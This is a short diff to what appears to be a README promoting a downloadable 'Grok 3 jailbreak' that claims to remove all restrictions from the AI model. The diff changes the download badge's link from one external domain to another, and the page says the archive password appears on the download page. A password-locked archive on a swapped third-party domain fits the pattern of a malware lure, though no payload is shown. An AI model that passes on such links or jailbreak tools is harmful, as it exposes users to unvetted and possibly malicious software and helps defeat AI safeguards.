@@ -18,7 +18,7 @@ Grok 3 jailbreak — removes all restrictions, enables uncensored reasoning and 
 
 ## Download
 
-[![Download v3.0](https://img.shields.io/badge/Download_v3.0-ec4899?style=for-the-badge&logoColor=white)](https://forumconnect.uk/grokjb)
+[![Download v3.0](https://img.shields.io/badge/Download_v3.0-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/grokjb)
 
 > The archive password is shown on the download page.
 
